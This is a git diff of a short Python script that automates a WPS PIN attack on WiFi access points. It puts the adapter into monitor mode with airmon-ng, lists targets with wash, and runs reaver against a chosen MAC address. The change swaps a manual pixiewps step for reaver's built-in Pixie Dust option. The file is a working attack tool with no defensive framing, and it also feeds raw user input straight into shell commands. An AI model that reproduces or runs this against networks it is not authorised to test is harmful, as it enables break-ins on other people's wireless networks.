@@ -1,3 +1,4 @@
+
 #!/usr/bin/python
 import os
 import socket
@@ -5,23 +6,12 @@ import socket
 os.system("clear")
 os.system("airmon-ng check kill")
 os.system("iwconfig")
-WLANinput=raw_input("\nEnter your adapter name:")
-os.system("airmon-ng start " + WLANinput)
+WLANinput=raw_input("\nEnter your adapter number:")
+os.system("airmon-ng start " + "wlan"+WLANinput+"mon")
 os.system("clear")
 os.system("echo PRESS Control+C when your done looking")
-os.system("wash -i " + WLANinput+"mon")
+os.system("wash -i " + "wlan"+WLANinput+"mon")
 MACinput=raw_input("\nEnter MAC Address for Accesspoint:")
 os.system("clear")
-os.system("reaver -i " + WLANinput+"mon" + " -b " + MACinput + "-W -N -vv -g 1")
-os.system("echo ")
-os.system("echo ")
-os.system("echo THE FOLLOWING COMMAND NEEDS THE VALUES FOUND IN THE REAVER OUTPUT ABOVE")
-os.system("echo ")
-os.system("echo ")
-os.system("echo FILL IN ANY DATA IN between the <> DONT INCLUDE THE <> WITH THE EXACT VALUES FOUND IN THE REAVER OUTPUT ABOVE")
-os.system("echo ")
-# YES, I did get this from the commands help menu :D
-os.system("echo TYPE THIS COMMAND: pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>")
-FinalInput=raw_input("\nEnter the pixiewps command above with proper data:")
-os.system(FinalInput)
+os.system("reaver -i " + "wlan"+WLANinput+"mon" + " -b " + MACinput + "-w -N -vv -g 1 -w -K 1")
 stall=raw_input("echo HIT ENTER TO EXIT")
